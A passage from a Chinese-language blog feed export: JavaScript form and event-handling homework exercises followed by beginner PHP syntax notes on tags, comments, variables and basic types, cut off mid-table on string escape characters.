<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Javascript简单示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">func1</span><span class="params">()</span></span></span></span><br><span class="line"><span class="actionscript">			&#123;alert(<span class="string">"function1 has been called"</span>);&#125;</span></span><br><span class="line"><span class="actionscript">			<span class="function"><span class="keyword">function</span> <span class="title">func2</span><span class="params">()</span></span></span></span><br><span class="line"><span class="actionscript">			&#123;alert(<span class="string">"function2 has been called"</span>);&#125;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"click"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"click"</span> <span class="attr">onclick</span>=<span class="string">"func1(),func2()"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用设计界面插入按钮</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516162930762.png"  alt="image-20200516162930762" style="zoom:80%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516163444483.png"  alt="image-20200516163444483" style="zoom: 67%;">

<p>更改按钮名称</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516163159847.png"  alt="image-20200516163159847" style="zoom:67%;">

<p>效果：</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516163457229.png"  alt="image-20200516163457229" style="zoom:67%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516163552676.png"  alt="image-20200516163552676" style="zoom:50%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516163602861.png"  alt="image-20200516163602861" style="zoom:50%;">

<ol start="6">
<li><p>声明对象</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Javascript example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">			<span class="function"><span class="keyword">function</span> <span class="title">student</span><span class="params">(name,school,grade)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">				<span class="keyword">this</span>.name=name;</span></span><br><span class="line"><span class="actionscript">				<span class="keyword">this</span>.school=school;</span></span><br><span class="line"><span class="actionscript">				<span class="keyword">this</span>.grade=grade;</span></span><br><span class="line">			&#125;</span><br><span class="line"><span class="actionscript">			hui=<span class="keyword">new</span> student(<span class="string">"nothing_gonna"</span>,<span class="string">"xx school"</span>,<span class="string">"seconde grade"</span>);</span></span><br><span class="line"><span class="actionscript">			<span class="keyword">with</span>(hui)</span></span><br><span class="line"><span class="javascript">			&#123;	<span class="built_in">document</span>.write(name+<span class="string">":"</span>+school+<span class="string">","</span>+grade+<span class="string">"&lt;br/&gt;"</span>);&#125;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">if</span>(<span class="built_in">window</span>.hui)&#123;</span></span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.write(<span class="string">"object hui exists"</span>);</span></span><br><span class="line">			&#125;</span><br><span class="line"><span class="actionscript">			<span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.write(<span class="string">"object hui doen't exists"</span>);</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516164623481.png"  alt="image-20200516164623481" style="zoom:67%;">
</li>
<li><p>验证文本框输入内容</p>
</li>
</ol>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516165440563.png"  alt="image-20200516165440563" style="zoom:67%;">

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Javascript example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">			<span class="function"><span class="keyword">function</span> <span class="title">getLoginMsg</span><span class="params">()</span></span></span></span><br><span class="line">			&#123;</span><br><span class="line"><span class="javascript">				loginMsg=<span class="built_in">document</span>.LoginForm;</span></span><br><span class="line"><span class="actionscript">				alert(<span class="string">"id:"</span>+loginMsg.userID.value+<span class="string">"\n"</span>+<span class="string">"password:"</span>+loginMsg.password.value);</span></span><br><span class="line">			&#125;</span><br><span class="line"><span class="actionscript">			<span class="function"><span class="keyword">function</span> <span class="title">setLoginMsg</span><span class="params">(Object)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">				alert(<span class="built_in">Object</span>.id);</span></span><br><span class="line">				&#125;</span><br><span class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"LoginForm"</span> <span class="attr">name</span>=<span class="string">"form1"</span> <span class="attr">action</span>=<span class="string">"1.php"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>userID:</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"userID"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">  password:</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"login"</span> <span class="attr">onclick</span>=<span class="string">"getLoginMsg()"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">    remember me </span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"checkbox"</span> <span class="attr">value</span>=<span class="string">"checkbox"</span> <span class="attr">onclick</span>=<span class="string">"setLoginMsg()"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516171645429.png"  alt="image-20200516171645429" style="zoom:67%;">

<h4 id="利用Javascript实现页面元素是否输入的校验，如果没有输入，则将焦点设置在该页面元素上"><a href="#利用Javascript实现页面元素是否输入的校验，如果没有输入，则将焦点设置在该页面元素上" class="headerlink" title="利用Javascript实现页面元素是否输入的校验，如果没有输入，则将焦点设置在该页面元素上"></a>利用Javascript实现页面元素是否输入的校验，如果没有输入，则将焦点设置在该页面元素上</h4><p>==设置焦点的函数：document.getElementById(“文本域的id”).focus();==</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>作业<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">judge</span><span class="params">()</span></span></span></span><br><span class="line">	&#123;</span><br><span class="line"><span class="javascript">		Msg=<span class="built_in">document</span>.LoginForm</span></span><br><span class="line"><span class="actionscript">       	<span class="keyword">if</span>(Msg.one.value==<span class="string">""</span>)</span></span><br><span class="line">			&#123;	</span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.getElementById(<span class="string">"i1"</span>).focus(); &#125;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">else</span> <span class="keyword">if</span>(LoginForm.two.value==<span class="string">""</span>)</span></span><br><span class="line">			&#123;	</span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.getElementById(<span class="string">"i2"</span>).focus(); &#125;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">else</span> <span class="keyword">if</span>(LoginForm.thr.value==<span class="string">""</span>)</span></span><br><span class="line">			&#123;	</span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.getElementById(<span class="string">"i3"</span>).focus(); &#125;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">else</span> alert(<span class="string">"1:"</span>+Msg.one.value+<span class="string">"\n2:"</span>+Msg.two.value+<span class="string">"\n3:"</span>+Msg.thr.value);</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"LoginForm"</span> <span class="attr">name</span>=<span class="string">"form1"</span>  <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">label</span>&gt;</span>1st</span><br><span class="line">	  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"one"</span> <span class="attr">id</span>=<span class="string">'i1'</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">label</span>&gt;</span>2nd</span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"two"</span> <span class="attr">id</span>=<span class="string">'i2'</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">label</span>&gt;</span>3rd</span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"thr"</span> <span class="attr">id</span>=<span class="string">'i3'</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"提交"</span> <span class="attr">onclick</span>=<span class="string">"judge()"</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>==提交按钮的type应该使button而不是submit，否则点击后会刷新表单并清空⬇⬇⬇⬇⬇⬇==</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/6ec26fbd2e2ae7b7f51c21fcfbd6976.png"  alt="6ec26fbd2e2ae7b7f51c21fcfbd6976" style="zoom:67%;">

<p>==chrome浏览器无法正常运行该文件，这里使用Microsoft edge可以正常使用==</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516232923713.png"  alt="image-20200516232923713" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516232942148.png"  alt="image-20200516232942148" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516233149210.png"  alt="image-20200516233149210" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516233101809.png"  alt="image-20200516233101809" style="zoom:50%;"></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516233224882.png"  alt="image-20200516233224882" style="zoom: 50%;">]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>web开发</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>php学习一 —— 基本语法</title>
    <url>/2020/05/26/php/php1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><div class="note info">
            <p>参考书籍《细说PHP》</p>
          </div>


<h1 id="第一个php脚本程序"><a href="#第一个php脚本程序" class="headerlink" title="第一个php脚本程序"></a>第一个php脚本程序</h1><p>将.php文件放在web服务器根目录下，访问<code>web服务器URL/xxx.php</code>,本地访问<code>http://localhost/xxx.php</code>.</p>
<p>调用函数phpinfo()可以看到系统相关信息、预定义变量，以及已经加载的php模块和配置信息</p>
<h1 id="php语言标记"><a href="#php语言标记" class="headerlink" title="php语言标记"></a>php语言标记</h1><h2 id="将php代码嵌入html中的位置"><a href="#将php代码嵌入html中的位置" class="headerlink" title="将php代码嵌入html中的位置"></a>将php代码嵌入html中的位置</h2><p>可以将php代码段嵌入到html的任意地方</p>
<p>当php遇到结束符 “?&gt;” 时，简单地将后面的内容原样输出，只到遇到下一个开始标记位置</p>
<p>在一个文件中的不同位置使用多个php标记时，这些标记之间的语法是<strong>一个整体</strong></p>
<p>对于输出打断文本而言，脱离php的解析模式，比php的echo和print效率更高</p>
<h2 id="解读开始和结束标记"><a href="#解读开始和结束标记" class="headerlink" title="解读开始和结束标记"></a>解读开始和结束标记</h2><div class="note info">
            <p>⭐&lt;?php ?&gt;⭐<br>和&lt;? ?&gt;<br>当在html页面中嵌入纯变量时，也可以使用&lt;?=$variablename ?&gt;</p>
          </div>

<div class="note info">
            <p>&lt;script language=”php”&gt;&lt;/script&gt;    (PHP7以前版本支持)<br>&lt;% %&gt;                        (PHP7以前版本支持)</p>
          </div>

<p>除非有特殊需求，否则使用<code>&lt;?php ?&gt;</code>,对于只包含php代码的文件，结束标识符最好不要存在，防止末尾被意外地注入空白符号</p>
<h1 id="指令分隔符“分号”"><a href="#指令分隔符“分号”" class="headerlink" title="指令分隔符“分号”"></a>指令分隔符“分号”</h1><p>使用<code>;</code></p>
<p>程序最后一行，即<code>?&gt;</code>前，可以不用分号</p>
<h1 id="程序注释"><a href="#程序注释" class="headerlink" title="程序注释"></a>程序注释</h1><p>多行：/* */</p>
<p>单行：//和#</p>
<div class="note warning">
            <p>多行注释无法嵌套多行注释，其它可以嵌套</p>
          </div>

<div class="note warning">
            <p>单行注释只对php内容有效，<code>//?&gt;</code>之后的html代码将被显示出来</p>
          </div>

<h1 id="在程序中使用空白处理"><a href="#在程序中使用空白处理" class="headerlink" title="在程序中使用空白处理"></a>在程序中使用空白处理</h1><p>空格、Tab、换行被php引擎忽略</p>
<p>代码规范：</p>
<ol>
<li>使用两个空行<ul>
<li>一个源文件的两个代码片段之间</li>
<li>两个类的声明之间</li>
</ul>
</li>
<li>使用一个空行<ul>
<li>两个函数声明之间</li>
<li>函数内的局部变量和函数的第一条语句之间</li>
<li>块注释或单行注释之前</li>
</ul>
</li>
<li>使用空格增加代码缩进提高可读性<ul>
<li>关键字与括号之间，注意函数名和左括号之间不能有空格</li>
<li>函数参数列表的逗号后</li>
<li>算式的操作符和运算符之间，二进制运算和一元运算除外</li>
<li>for语句中的逗号后</li>
<li>强制类型转换语句中的强制类型的右括号与表达式之间应该用逗号隔开，并添加空格</li>
</ul>
</li>
</ol>
<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>建议所有用到数据的地方，先将数据赋值给一个变量</p>
<h2 id="变量的声明"><a href="#变量的声明" class="headerlink" title="变量的声明"></a>变量的声明</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = <span class="number">100</span>;						</span><br><span class="line">	$b = <span class="string">"string"</span>;</span><br><span class="line">	$c = <span class="keyword">true</span>;</span><br><span class="line">	$d = <span class="number">99.99</span>;</span><br><span class="line"></span><br><span class="line">	$key1 = $a;						<span class="comment">//声明变量$key1,将$a的值赋给$key1</span></span><br><span class="line">	$key2 = $b;		</span><br><span class="line"></span><br><span class="line">	$a = $b = $c = $d = <span class="string">"value"</span>;	<span class="comment">//同时声明多个变量，并附上相同的值</span></span><br></pre></td></tr></table></figure>

<p>变量的作用域：</p>
<ol>
<li>大部分不是在函数中声明的变量，可以在一个页面的所有php模式下使用，包含include和require引入的文件</li>
<li>如果使用了Cookie和Session，可以在多个页面中使用</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $var = <span class="string">''</span>;								<span class="comment">//声明变量$var并赋值空</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($var))&#123;						<span class="comment">//true，因为$var为空值</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$var is either 0 or not set at all"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($var))&#123;						<span class="comment">//false，$var已经设置</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$var is not set at all"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unset</span>($var);							<span class="comment">//销毁$var，释放内容</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($var))&#123;						<span class="comment">//false，$var已经销毁</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"this var is set so i will print"</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<div class="note info">
            <p>如果empty()的参数是非零或者非空的值，则返回false</p><p>“”、0、“0”、NULL、FALSE、array()、$var及任何没有属性的对象都被认为是空的</p><p>如果参数为空，则返回true</p>
          </div>

<div class="note info">
            <p>如果函数isset()的参数存在，则返回TRUE，否则返回FALSE</p><p>若参数是一个被设置成NULL的变量或已使用unset()释放，将返回FALSE</p>
          </div>

<div class="note warning">
            <p>NULL字节（”\0”）不等同于PHP的NULL常数，</p><p>推荐使用!empty($var)的方式判断一个变量存在且不为空</p>
          </div>

<h2 id="变量的命名"><a href="#变量的命名" class="headerlink" title="变量的命名"></a>变量的命名</h2><p>变量名严格区别大小写</p>
<p>内置结构和关键字及用户自定义的类名不区分大小写，如echo、while、class名称、function名称</p>
<p>字母或下划线开头</p>
<table>
<thead>
<tr>
<th>PHP常用关键字</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>and</td>
<td>or</td>
<td>xor</td>
<td>if</td>
<td>else</td>
<td>for</td>
</tr>
<tr>
<td>foreach</td>
<td>while</td>
<td>do</td>
<td>switch</td>
<td>case</td>
<td>break</td>
</tr>
<tr>
<td>continue</td>
<td>default</td>
<td>as</td>
<td>elseif</td>
<td>declare</td>
<td>endif</td>
</tr>
<tr>
<td>endfor</td>
<td>endforeach</td>
<td>endwhile</td>
<td>endswitch</td>
<td>enddeclare</td>
<td>array</td>
</tr>
<tr>
<td>static</td>
<td>const</td>
<td>class</td>
<td>extends</td>
<td>new</td>
<td>exception</td>
</tr>
<tr>
<td>global</td>
<td>function</td>
<td>exit</td>
<td>die</td>
<td>echo</td>
<td>print</td>
</tr>
<tr>
<td>eval</td>
<td>isset</td>
<td>unset</td>
<td>return</td>
<td>defien</td>
<td>defined</td>
</tr>
<tr>
<td>include</td>
<td>include_once</td>
<td>require</td>
<td>require_once</td>
<td>cfunction</td>
<td>use</td>
</tr>
<tr>
<td>var</td>
<td>Public</td>
<td>private</td>
<td>protected</td>
<td>implements</td>
<td>interface</td>
</tr>
<tr>
<td>extends</td>
<td>abstract</td>
<td>clone</td>
<td>try</td>
<td>catch</td>
<td>throw</td>
</tr>
</tbody></table>
<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $hi = <span class="string">"hello"</span>;	<span class="comment">//声明一个普通变量$hi</span></span><br><span class="line">	$$hi = <span class="string">"world"</span>;	<span class="comment">//声明一个可变变量$$hi,</span></span><br><span class="line">					<span class="comment">//$hi的值是hello,相当于声明$hello的值是“world”</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$hi $hello\n"</span>;	<span class="comment">//输出hello world</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$hi $&#123;$hi&#125;\n"</span>;	<span class="comment">//输出hello world</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$hi $$hi\n"</span>;	<span class="comment">//输出hello $hello</span></span><br></pre></td></tr></table></figure>

<p>运行结果<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/26/php/php1/php一.assets\image-20200526205949977.png"  alt="image-20200526205949977" style="zoom:80%;"></p>
<h2 id="变量的引用赋值"><a href="#变量的引用赋值" class="headerlink" title="变量的引用赋值"></a>变量的引用赋值</h2><table>
<thead>
<tr>
<th>$a=&amp;$b</th>
<th>php</th>
<th>C++</th>
</tr>
</thead>
<tbody><tr>
<td>b是a的别名</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>其中一个的值改变会导致另外一个改变</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td></td>
<td>将$b的引用赋值给$a</td>
<td>地址指针</td>
</tr>
<tr>
<td>释放其中一个</td>
<td>解除a、b的值关联关系，只释放一个</td>
<td>两个都释放</td>
</tr>
</tbody></table>
<h1 id="变量的类型"><a href="#变量的类型" class="headerlink" title="变量的类型"></a>变量的类型</h1><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/26/php/php1/image-20200526213837647.png"  alt="image-20200526213837647"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $str=<span class="string">"hello world"</span>;</span><br><span class="line">	var_dump($str);<span class="comment">//直接输出变量的类型和值</span></span><br></pre></td></tr></table></figure>



<h2 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h2><p>被认为是FALSE的值</p>
<ul>
<li>FALSE</li>
<li>0、0.0</li>
<li>“\0”、”0”</li>
<li>没有成员变量的数组</li>
<li>没有单元的对象（仅限php4）</li>
<li>特殊类型NULL、尚未设定的变量</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    var_dump((bool) <span class="string">""</span>);<span class="comment">//false,“”的布尔值是false</span></span><br></pre></td></tr></table></figure>

<h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $int = <span class="number">1234</span>;</span><br><span class="line">    $int = <span class="number">-123</span>;</span><br><span class="line">    $int = <span class="number">0123</span>;</span><br><span class="line">    $int = <span class="number">0x1A</span>;</span><br><span class="line">    $int = <span class="number">0b1111</span>;<span class="comment">//二进制</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> PHP_INT_SIZE;	<span class="comment">//int占四个字节，8</span></span><br><span class="line"><span class="keyword">echo</span> PHP_INT_MAX;	<span class="comment">//int最大值，9223372036854775807</span></span><br><span class="line"><span class="keyword">echo</span> PHP_INT_MIN;	<span class="comment">//int最小值，-9223372036854775808</span></span><br></pre></td></tr></table></figure>


<p>php没有无符号整数，超出范围后会被解释为float（这点和其它编译器有出入）</p>
<p>eg.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump((int) <span class="number">9223372036854775810</span>);</span><br><span class="line"></span><br><span class="line">输出为int(<span class="number">-9223372036854775808</span>)</span><br></pre></td></tr></table></figure>

<h2 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $float = <span class="number">1.234</span>;</span><br><span class="line">    $float = <span class="number">1.2e3</span>;</span><br><span class="line">    $float = <span class="number">7E-10</span>;</span><br></pre></td></tr></table></figure>

<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>php字符串没有长度限制</p>
<h3 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//这是一个使用单引号引起来的简单字符串</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'this is a simple string'</span>;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>this is a simple string</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//在单引号中如果需要在包含单引号，需要使用转义字符“\”</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'this is a \'simple\' string'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>this is a ‘simple’ string</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//只能将反斜杠转义输出一个反斜杠，其它输出都是无效的</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'this \n is \r a \t simple string\\'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>this \n is \r a \t simple string\</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = <span class="number">100</span>;</span><br><span class="line">	<span class="comment">//将变量名原样输出，不会在单引号中解析这个变量</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'this is a simple $str string'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>this is a simple $str string</p>
</blockquote>
<h3 id="双引号"><a href="#双引号" class="headerlink" title="双引号"></a>双引号</h3><ul>
<li>可以使用更多特殊字符的转义序列</li>
<li>可以解析变量、数值组、或者对象属性的方法</li>
<li>用花括号括起表达式</li>
</ul>
<table>
<thead>
<tr>
<th>转义字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>\n</td>
<td>换行符</td>
</tr>
<tr>
<td>\r</td>
<td>回车符</td>
</tr>
<tr>
<td>\t</td>
